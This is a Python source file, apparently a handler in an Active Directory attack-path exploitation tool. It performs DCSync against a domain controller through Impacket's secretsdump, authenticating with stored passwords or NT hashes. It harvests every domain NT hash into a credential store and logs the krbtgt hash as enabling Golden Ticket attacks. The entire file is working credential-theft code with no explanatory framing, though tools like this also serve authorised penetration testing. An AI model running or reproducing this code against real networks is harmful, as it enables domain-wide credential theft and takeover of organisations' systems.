"""DCSync / replication edge exploitation handler."""

from __future__ import annotations

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import impacket_wrapper as impacket


@register_handler("GetChanges", "GetChangesAll", "GetChangesInFilteredSet", "DCSync")
class DCSyncHandler(BaseEdgeHandler):
    """Handles GetChanges, GetChangesAll, and DCSync edges.

    If the principal has both ``DS-Replication-Get-Changes`` and
    ``DS-Replication-Get-Changes-All`` (or the compound ``DCSync`` edge),
    this handler uses Impacket's ``secretsdump.py`` to replicate
    credentials from the domain controller.

    Primary targets:
    * ``krbtgt`` -- for Golden Ticket attacks.
    * Domain admin accounts -- for direct compromise.

    The DCSync itself is a read-only operation from AD's perspective;
    no rollback is needed for the dump.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        principal = self._resolve_principal(edge)
        domain = self._get_domain()

        # Verify we have credentials for the principal
        has_cred = self.cred_store.get_best_credential(principal, domain) is not None
        if not has_cred:
            cfg = self.config.credentials
            if cfg.username.lower() != principal.lower():
                return False, (
                    f"No credential available for {principal}; cannot authenticate for DCSync"
                )

        # DCSync requires both GetChanges and GetChangesAll.  If this edge
        # type is "DCSync" we trust BloodHound's composite edge.  For
        # individual edges (GetChanges / GetChangesAll), the orchestrator
        # should verify both are present; we proceed optimistically.
        if edge.edge_type == "GetChanges":
            self.logger.warning(
                "GetChanges alone is insufficient for DCSync; "
                "GetChangesAll is also required.  Proceeding optimistically."
            )
        elif edge.edge_type == "GetChangesAll":
            self.logger.warning(
                "GetChangesAll alone is insufficient for DCSync; "
                "GetChanges is also required.  Proceeding optimistically."
            )

        return True, f"DCSync prerequisites met for {principal}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        domain = self._get_domain()
        dc_host = self._get_dc_host()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would perform DCSync as {principal} against {dc_host}",
                [],
            )

        self.logger.info("Performing DCSync as %s against %s", principal, dc_host)

        _target_str, auth_flags = self._get_impacket_auth(principal)

        # Determine password/hash for the target string
        cred = self.cred_store.get_best_credential(principal, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        result = await impacket.secretsdump(
            target=dc_host,
            auth_args=auth_flags,
            domain=domain,
            username=principal,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_host,
            just_dc=True,
            timeout=180,
        )

        if not result["success"]:
            return False, f"DCSync failed: {result.get('error', 'unknown')}", []

        hashes: dict[str, str] = result.get("hashes", {})
        new_creds: list[Credential] = []

        for user, nt in hashes.items():
            new_creds.append(
                Credential(
                    cred_type=CredentialType.nt_hash,
                    value=nt,
                    username=user,
                    domain=domain,
                    obtained_from=f"DCSync as {principal}",
                )
            )

        # Highlight krbtgt if captured
        if "krbtgt" in hashes:
            self.logger.info(
                "krbtgt hash captured: %s (Golden Ticket possible)", hashes["krbtgt"]
            )

        return (
            True,
            f"DCSync complete: extracted {len(hashes)} NT hashes",
            new_creds,
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # DCSync is a read-only replication operation.
        return None
